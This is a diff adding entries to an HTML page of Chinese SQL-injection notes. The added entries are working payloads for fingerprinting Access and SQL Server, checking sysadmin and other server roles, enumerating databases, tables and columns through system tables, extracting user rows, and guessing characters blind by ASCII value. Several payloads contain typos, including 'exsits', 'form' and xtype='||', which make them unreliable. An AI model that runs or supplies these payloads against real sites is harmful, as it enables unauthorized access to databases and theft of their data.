@@ -794,8 +794,14 @@
 <li>判断数据库<ul>
 <li><code>and exsits(select * from msysobjects)&gt;0</code> access</li>
 <li><code>and exsits(select * from sysobjects)&gt;0</code> sqlserver</li>
+<li>database()</li>
+<li>version()</li>
+<li>user()</li>
+<li>@@version_compile_os  操作系统</li>
 </ul>
 </li>
+</ul>
+<ul>
 <li>判断数据库表<ul>
 <li><code>and exists(select * from admin)</code></li>
 </ul>
@@ -809,7 +815,32 @@
 </ul>
 </li>
 <li>判断数据第一个字符内容<ul>
-<li>and (select top 1 asc(mid(admin,1,1)) from admin)&gt;100 返回正常说明该字符的ascii码值大于100</li>
+<li><code>and (select top 1 asc(mid(admin,1,1)) from admin)&gt;100</code>返回正常说明该字符的ascii码值大于100</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>测试权限结构<ul>
+<li><code>?id=1 and 1=(select IS_SRVROLEMEMBER(‘SYSADMIN’));--</code> \还可以是serveradmin，setupadmin,securityadmin,diskadmin,bulkadmin,db_owner</li>
+</ul>
+</li>
+<li>获取用户数据库名称<ul>
+<li><code>?id=1 and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)</code></li>
+<li>?id=1 and 1= (select top 1 name from master..sysdatabases where dbid&gt;4 and name &lt;&gt; ‘第一个用户数据库’)</li>
+</ul>
+</li>
+<li>获取数据库表<ul>
+<li>?id=1 and 1=(select top 1 name form sysobjects where xtype=’u’)\获取第一张表</li>
+<li>?id=1 and 1=(select top 1 name from sysobjects where xtype=’||’ and name &lt;&gt; ‘第一张表名’)\获取第二张表</li>
+</ul>
+</li>
+<li>获取列名<ul>
+<li>?id=1 and 1=(select top 1 name from syscolumns where id = (select id from sysobjects where name = ‘users’))\获取第一列列名</li>
+<li>?id=1 and 1= (select top 1 name from syscolumns where id = (select id from sysobjects where name = ‘users’) and name &lt;&gt;‘第一列列名’)\获取第二列列名</li>
+</ul>
+</li>
+<li>获取内容<ul>
+<li>id=1 and 1=(select top 1 uname from users)  </li>
 </ul>
 </li>
 </ul>
